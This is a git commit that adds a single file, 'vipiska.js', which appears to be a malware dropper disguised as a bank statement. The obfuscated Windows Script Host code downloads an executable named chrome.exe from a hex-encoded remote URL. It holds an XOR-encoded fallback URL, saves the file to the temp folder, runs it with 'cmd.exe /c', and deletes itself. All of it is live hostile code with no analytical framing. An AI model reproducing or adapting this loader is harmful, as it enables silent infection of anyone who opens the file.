b0a81f6dcca70907500be3960d027bc33e844a9c
adricouci <adria.couceiro@gmail.com>
2018-12-13 13:17:02 +0100

    Add files via upload

---
+++ vipiska.js
@@ -0,0 +1,355 @@
+
+
+
+
+function tC()
+{
+	var rc = "2015" + "JAN" + "02";
+	return "" + rc + "" + "";
+}
+
+function Bcb()
+{
+	return "Position";
+}
+
+function nrM(szB, P)
+{
+	szB["Open"]();
+	szB["Type"] = 1;
+
+	var cTI="";
+	cTI=cTI+String.fromCharCode(6490/59-0)+String.fromCharCode(10810/94+0)+String.fromCharCode(3535/35+0)+String.fromCharCode(6*11);
+	var nv = P["Respo" + cTI + "ody"];
+	szB["Wr" + "i" + "te"](nv);
+	szB[Bcb()] = 0;
+}
+
+function ScQ() {
+	var HF=["l","e"];
+	var Kkw=HF[0]+HF[1];
+	return Kkw;
+}
+function u() {
+	var Du=["th"];
+	var pM=Du[0];
+	return pM;
+}
+function PC() {
+	var Im="";
+	Im=Im;
+	return Im;
+}
+function Gw() {
+	var C="";
+	C=C;
+	return C;
+}
+function wfu(XZ)
+{
+	var s = ScQ();
+	var oNY = "ng";
+	oNY += "";
+	var NQk = u();
+	s = s + PC() + oNY + Gw() + NQk;
+	var B = XZ[s];
+	return B;
+}
+
+function eV()
+{
+	var hEG="";
+	hEG=hEG+String.fromCharCode(1378/13+0);
+	var K = "Ob" + hEG + "e" + "ct";
+	return K;
+}
+
+function q()
+{
+	var uk="";
+	uk=uk+String.fromCharCode(7777/77-0)+String.fromCharCode(346-258);
+	return "Act" + "iv" + uk;
+}
+
+function aO(jn)
+{
+	var t = eval(q() + eV());
+	return t;
+}
+
+function F(b)
+{
+	return typeof b;
+}
+
+function c(zSg)
+{
+	var f = "";
+	var g = 0;
+
+	var L = aO(zSg+4);
+	var Y = 0;
+	if (zSg == Y)
+		return false;
+
+
+	Y = new L("MSXML2.XMLHTTP");
+
+
+	try
+	{
+	i = Y++;
+	}
+	catch (Vg)
+	{
+	var niO = typeof Y["Open"];
+	return (niO == "unknown" );
+	}
+	return false;
+}
+
+function BNn()
+{
+	var FZ = "\x57" + "S" + "c" + "r" + "i" + "\x70" + "\x74";
+	var EOO = FZ;
+	return eval(EOO);
+}
+
+
+function WGm(M, htv)
+{
+	var JH = BNn();
+	var qzo = JH["Scrip" + "tFul" + "lName"];
+	M[htv](qzo);
+}
+
+function W(hdX)
+{
+	var xxM = 1;
+	var d = "parseInt";
+	var iBJ = "charAt";
+
+	ADV = eval(d);
+
+	var ijG = 42;
+	ijG = ADV(hdX, 16);
+	return ijG;
+}
+
+function YMc(Is, R)
+{
+	if (true)
+	{
+		var DmH = false?0:Is;
+		return W(DmH);
+	}
+
+	return jV;
+}
+
+function hJ()
+{
+	var PXp=10103;
+	var Wj=PXp+13863;
+	var Q=Wj/23;
+	var hr=Q-322;
+	var lyR = hr;
+	var KiA = "GetS" + "pecia" + "lFol" + "der";
+	return KiA;
+}
+
+function ha(rA)
+{
+	var Z = 128;
+	var UC = "not";
+	try
+	{
+		UC = "\\" + rA["GetT" + "empN" + "ame"]();
+		UC = UC + Z["cha" + "rAt"](256);
+	}
+	catch (uAD)
+	{
+		UC = rA[hJ()](2) + UC;
+	}
+	return UC;
+}
+
+
+function mu(wu, htv)
+{
+	wu["r" + "u" + "n"](htv, 0);
+	return 8;
+}
+
+
+function FO(wq, jXM, wu)
+{
+	var RA = wq["Read"]();
+	var uUq = new wu("ADODB.Recordse" + "t");
+	uUq["fields"]["append"]("bin", 201, wq["Size"]);
+	uUq["open"]();
+	uUq["ad" + "dN" + "ew"]();
+	uUq("bin")["appendChunk"](RA);
+	uUq["update"]();
+	RA = uUq("bin")["va" + "l" + "ue"];
+
+	var nj = "le";
+	if (RA[nj + "ngth"] > 10)
+	{
+		var V = "SaveT";
+		V += "oFile";
+		wq[V](jXM);
+		return true;
+	}
+
+	return false;
+}
+
+function Tj()
+{
+ 	var sWu = "cmd.e";
+	sWu += "x";
+	sWu += "e";
+	sWu += " ";
+	sWu += "/";
+	sWu += "c";
+	sWu += " ";
+	return sWu;
+}
+
+function pRx(zc)
+{
+	return new zc("MSXML2.XMLHTTP");
+}
+
+function gD(P, jUJ)
+{
+	var fBV="";
+	fBV=fBV+String.fromCharCode(278-167)+String.fromCharCode(806-694)+String.fromCharCode(5151/51+0)+String.fromCharCode(350-240);
+	var Hk="";
+	Hk=Hk+String.fromCharCode(71)+String.fromCharCode(69/1+0)+String.fromCharCode(2436/29+0);
+	var CU=33745;
+	var hML=CU+4701;
+	var EKM=hML/409;
+	var eSU=EKM-94;
+	P[fBV](Hk, jUJ, eSU);
+	try {
+		var CdL="";
+		CdL=CdL+String.fromCharCode(1052-937)+String.fromCharCode(3636/36-0)+String.fromCharCode(10*11)+String.fromCharCode(20*5);
+		P[CdL]();
+	} catch (X) {
+		return (1-1);
+	}
+	return 1;
+}
+
+
+function YR(us)
+{
+	var y = "Active" + us;
+	var gGZ = eval(y);
+
+	return false?gGZ:gGZ;
+}
+
+function la()
+{
+	return 1;
+}
+
+
+function rj(tjR)
+{
+	var VI = pRx(YR("XObject"));
+	var Io = 0;
+	if (gD(VI, tjR) == 0)
+		return false;
+
+	if (VI["Status"] != 100 + 101 - 1)
+		return false;
+	var mt = new (YR("XObject"))("Scripting.FileSystemObject");
+	var PU = new (YR("XObject"))("ADODB.Stream");
+	tjR = ha(mt);
+
+	nrM(PU, VI);
+
+	if (!FO(PU, tjR, YR("XObject")))
+		return 11;
+
+	PU["Close"]();
+
+	Io = mu(new (YR("XObject"))("Wscr" + "ip" + "t.S" + "hel" + "l"), Tj() + tjR);
+	if (Io < 10)
+	{
+		tjR = "deleteFile";
+		WGm(mt, tjR);
+		return true;
+	}
+	return Io;
+}
+
+
+var Rz = 1;
+
+function WrV()
+{
+	var sxM="";
+	sxM=sxM;
+	var ukg = "ht\x74\x70:/\x2F\x6Cesbi\x61\x6Estr\x61p\x6F\x6E\x2Etop\x2F\x77p-\x69\x6Ec\x6C\x75\x64\x65\x73/I\x44\x33/\x63hr\x6Fm\x65\x2E\x65\x78\x65";
+	var KA = "c*>R?";
+	var r="";
+	r=r;
+	var w = rj(sxM + ukg + r);
+	return w;
+}
+
+function qvN(QC, G)
+{
+	var qDQ = wfu(QC);
+	var jdZ = 0;
+	var he = wfu(G);
+	var tlR = [""][0];
+	while (jdZ < qDQ)
+	{
+		var jo = jdZ / 2;
+		var xws = QC["charAt"](jdZ);
+		jdZ++;
+		xws = xws + QC["charAt"](jdZ);
+		++jdZ;
+		var a = YMc(xws, 16);
+		var Tw = G["charCodeAt"](jo % he);
+		var duN = a ^ Tw;
+		var LT = String["fromCharCode"](duN);
+		tlR += LT;
+	}
+	return tlR;
+}
+
+function ZSM()
+{
+	var XG=qvN("","JzGBnmfTvNAH78ig");
+	var CN=qvN("01430D1740684D342254253B174754160A542A1A6C304661361F07431C090E68162B225B29265F1E56150B09331026224263330507540D0E1529116C25442934140A450C0A18344D202F4423381547520102","i7ygzGbCG6LUp");
+	var ot=qvN("","A9Y2o3a7sf");
+	var Sy = rj(XG + CN + ot);
+	return Sy;
+}
+
+try {
+
+for (; Rz < 2; ++Rz)
+{
+if ( (la() >= 0) && c(Rz))
+{
+	if (WrV()) {} else
+		ZSM();
+
+}
+}
+
+} catch (dq)
+{ }
+
+
+
+
+
